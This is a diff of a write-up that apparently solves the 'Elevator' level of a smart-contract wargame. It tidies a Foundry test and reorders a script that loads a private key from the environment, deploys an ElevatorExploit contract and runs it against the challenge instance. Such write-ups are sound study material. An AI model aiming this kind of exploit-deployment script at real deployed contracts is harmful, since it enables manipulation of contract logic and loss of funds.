@@ -169,14 +169,7 @@ contract ElevatorExploit is Building {
 contract ElevatorTest is Test {
 
     Elevator public level = new Elevator();
-    address instance = payable(vm.addr(0x10053)); 
     address hacker = vm.addr(0x1337); 
-
-    function setUp() public {
-
-        vm.prank(instance);
-        
-    }
 
     function testElevatorHack() public {
 
@@ -208,17 +201,16 @@ forge test --match-contract ElevatorTest -vvvv
 ```solidity
 contract Exploit is Script {
 
-        Elevator level = Elevator(instance);  
-        ElevatorExploit public exploit;
-        address instance = vm.envAddress("INSTANCE_LEVEL11"); 
-        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
-        
-        function run() external {
+    address instance = vm.envAddress("INSTANCE_LEVEL11");  
+    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
+    Elevator level = Elevator(instance);  
+    ElevatorExploit public exploit;
 
-            vm.startBroadcast(hacker);
-            exploit = new ElevatorExploit();
-            exploit.run(level);
-            vm.stopBroadcast();
+    function run() external {
+        vm.startBroadcast(hacker);
+        exploit = new ElevatorExploit();
+        exploit.run(level);
+        vm.stopBroadcast();
     }
 }
 ```
